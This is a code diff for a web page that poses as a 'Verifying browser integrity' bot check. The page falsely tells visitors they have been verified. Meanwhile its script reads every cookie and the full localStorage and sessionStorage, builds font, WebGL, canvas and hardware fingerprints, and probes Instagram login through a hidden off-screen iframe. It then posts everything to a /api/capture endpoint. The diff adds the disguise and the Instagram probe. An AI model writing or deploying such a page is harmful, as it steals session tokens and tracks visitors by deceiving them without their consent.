@@ -3,79 +3,128 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>Verifying...</title>
 <style>
-  body { background: #0f0f0f; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-  .container { text-align: center; max-width: 600px; }
-  h1 { font-size: 1.5rem; margin-bottom: 0.5rem; }
-  .blink { animation: blink 1s infinite; }
-  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
-  .small { font-size: 0.8rem; opacity: 0.6; }
+  body { background: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', system-ui, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
+  .container { text-align: center; max-width: 500px; }
+  .spinner { width: 40px; height: 40px; border: 3px solid #1a3a2a; border-top: 3px solid #00ff88; border-radius: 50%; margin: 20px auto; animation: spin 0.8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  h1 { font-size: 1.3rem; color: #00ff88; margin-bottom: 8px; }
+  .step { color: #666; font-size: 0.85rem; margin: 4px 0; }
+  .step.active { color: #00ff88; }
+  .step.done { color: #44aa44; }
+  .step.fail { color: #aa4444; }
+  .check { display: inline-block; width: 16px; text-align: center; }
+  .hidden { display: none; }
+  .checkmark { color: #00ff88; font-size: 3rem; }
+  .done-text { color: #00ff88; font-size: 1.1rem; margin-top: 10px; }
 </style>
 </head>
 <body>
-<div class="container">
-  <h1>Connecting<span class="blink">...</span></h1>
-  <p class="small">Establishing secure session</p>
+<div class="container" id="statusContainer">
+  <div class="spinner" id="spinner"></div>
+  <h1 id="mainStatus">Verifying browser integrity</h1>
+  <div id="steps">
+    <div class="step" id="step1"><span class="check" id="c1">&#9679;</span> Checking browser configuration</div>
+    <div class="step" id="step2"><span class="check" id="c2">&#9679;</span> Analyzing session data</div>
+    <div class="step" id="step3"><span class="check" id="c3">&#9679;</span> Checking platform security</div>
+  </div>
+</div>
+<div class="container hidden" id="doneContainer">
+  <div class="checkmark">&#10003;</div>
+  <div class="done-text">Verification complete &mdash; you are not a robot</div>
 </div>
 
 <script>
 (async function() {
+  const $ = id => document.getElementById(id);
+  const markStep = (id, status) => {
+    const el = $(id);
+    el.className = 'step ' + status;
+    el.querySelector('.check').textContent = status === 'done' ? '#' : status === 'fail' ? 'X' : '*';
+  };
+
+  await new Promise(r => setTimeout(r, 400));
+  $('step1').classList.add('active');
+
   const payload = {
     timestamp: new Date().toISOString(),
     url: window.location.href,
     referrer: document.referrer || 'direct',
-    // Browser & OS
+    // Instagram check results
+    instagram: { checked: false, loginDetected: false, error: null },
     userAgent: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
     languages: navigator.languages,
     cookiesEnabled: navigator.cookieEnabled,
     doNotTrack: navigator.doNotTrack,
-    // Screen
     screen: {
-      width: screen.width,
-      height: screen.height,
-      availWidth: screen.availWidth,
-      availHeight: screen.availHeight,
-      colorDepth: screen.colorDepth,
-      pixelDepth: screen.pixelDepth
+      width: screen.width, height: screen.height,
+      availWidth: screen.availWidth, availHeight: screen.availHeight,
+      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth
     },
     window: {
-      innerWidth: window.innerWidth,
-      innerHeight: window.innerHeight,
-      outerWidth: window.outerWidth,
-      outerHeight: window.outerHeight,
+      innerWidth: window.innerWidth, innerHeight: window.innerHeight,
+      outerWidth: window.outerWidth, outerHeight: window.outerHeight,
       devicePixelRatio: window.devicePixelRatio
     },
-    // Time
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     timezoneOffset: new Date().getTimezoneOffset(),
-    // Cookies
     cookies: document.cookie || 'none',
-    // Storage
     localStorage: Object.keys(localStorage).length > 0 ? Object.entries(localStorage).reduce((acc,[k,v]) => { acc[k]=v; return acc; }, {}) : 'empty',
     sessionStorage: Object.keys(sessionStorage).length > 0 ? Object.entries(sessionStorage).reduce((acc,[k,v]) => { acc[k]=v; return acc; }, {}) : 'empty',
-    // Hardware
     hardwareConcurrency: navigator.hardwareConcurrency,
     deviceMemory: navigator.deviceMemory || 'unknown',
-    // Connection
     connection: navigator.connection ? {
       effectiveType: navigator.connection.effectiveType,
       downlink: navigator.connection.downlink,
       rtt: navigator.connection.rtt,
       saveData: navigator.connection.saveData
     } : 'unknown',
-    // Battery
     battery: 'unknown'
   };
 
-  // Battery API
+  // Battery
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
       payload.battery = { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
     } catch(e) {}
+  }
+
+  // Instagram check - try hidden iframe
+  try {
+    $('mainStatus').textContent = 'Checking account integrity...';
+    $('step3').classList.add('active');
+    markStep('step1', 'done');
+    markStep('step2', 'done');
+
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px';
+    iframe.src = 'https://www.instagram.com/';
+    document.body.appendChild(iframe);
+
+    const result = await new Promise(resolve => {
+      let loaded = false;
+      iframe.onload = () => { loaded = true; resolve('loaded'); };
+      iframe.onerror = () => resolve('blocked');
+      setTimeout(() => resolve(loaded ? 'loaded' : 'timeout'), 5000);
+    });
+
+    document.body.removeChild(iframe);
+
+    payload.instagram = {
+      checked: true,
+      iframeResult: result,
+      loginDetected: false,
+      note: 'Cross-origin restrictions prevent direct Instagram login detection. Iframe ' + result + '.'
+    };
+
+    markStep('step3', 'done');
+  } catch(e) {
+    payload.instagram = { checked: true, error: e.message, loginDetected: false };
+    markStep('step3', 'done');
   }
 
   // Font fingerprinting
@@ -108,7 +157,7 @@
   document.body.removeChild(base);
   payload.fonts = detected;
 
-  // WebGL fingerprinting
+  // WebGL
   try {
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -137,21 +186,19 @@
     payload.canvasFingerprint = c.toDataURL();
   } catch(e) {}
 
-  // Send data to server
+  // Send data
   try {
-    const res = await fetch('/api/capture', {
+    await fetch('/api/capture', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if (res.ok) {
-      document.querySelector('h1').textContent = 'Connected';
-      document.querySelector('.small').textContent = 'Session established securely';
-    }
-  } catch(e) {
-    document.querySelector('h1').textContent = 'Connection error';
-    document.querySelector('.small').textContent = 'Could not reach server';
-  }
+  } catch(e) {}
+
+  // Show done screen
+  $('spinner').classList.add('hidden');
+  $('statusContainer').classList.add('hidden');
+  $('doneContainer').classList.remove('hidden');
 })();
 </script>
 </body>
